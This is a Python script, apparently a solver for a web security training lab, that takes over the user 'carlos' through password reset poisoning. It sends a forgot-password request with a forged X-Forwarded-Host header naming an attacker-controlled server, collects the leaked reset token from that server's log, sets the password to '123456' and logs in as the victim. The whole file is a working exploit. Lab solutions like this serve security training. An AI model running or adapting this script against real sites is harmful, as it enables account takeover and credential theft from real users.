import requests
import re

def request_password_reset(session, domain, server):
    url = domain + '/forgot-password'
    headers = {'X-Forwarded-Host': server}
    data = {'username': 'carlos'}
    r = session.post(url, headers=headers, data=data, allow_redirects=False)
    if (r.status_code == 200):
        print('Password reset request sent')

def get_token(session, server):
    url = 'https://' + server + '/log'
    r = session.get(url)
    token = re.findall(r'temp-forgot-password-token=(\S+)', r.text)
    return token[-1]

def change_password(session, domain, token):
    url = domain + '/forgot-password?temp-forgot-password-token=' + token
    data = {'temp-forgot-password-token': token, 'new-password-1': '123456', 'new-password-2': '123456'}
    r = session.post(url, data=data, allow_redirects=False)
    if (r.status_code == 302):
        print('Password changed')

def login(session, domain, username, password):
    url = domain + '/login'
    data = {'username': username, 'password': password}
    r = session.post(url, data=data, allow_redirects=False)
    if (r.status_code == 302):
        print('Login success')
    session.get(domain + '/my-account')            

def verify(session, domain):
    r = session.get(domain)
    if ('Solved' in r.text):
        print('Solved. Visit ' + domain + ' to see the solution.')
    else:
        print('Not solved yet.')
        
if __name__ == '__main__':
    url = input('Enter the URL the lab provide: ')
    domain = re.search(r'^(https?://[^/]+)', url).group(1)
    server_url = input('Enter the URL of the server: ')
    server_domain = re.search(r'^https?://([^/]+)', server_url).group(1)
    with requests.Session() as session:
        print('Requesting password reset')
        request_password_reset(session, domain, server_domain)
        print('Getting token')
        token = get_token(session, server_domain)
        print('Changing password')
        change_password(session, domain, token)
        print('Logging in as carlos')
        login(session, domain, 'carlos', '123456')
        verify(session, domain)
        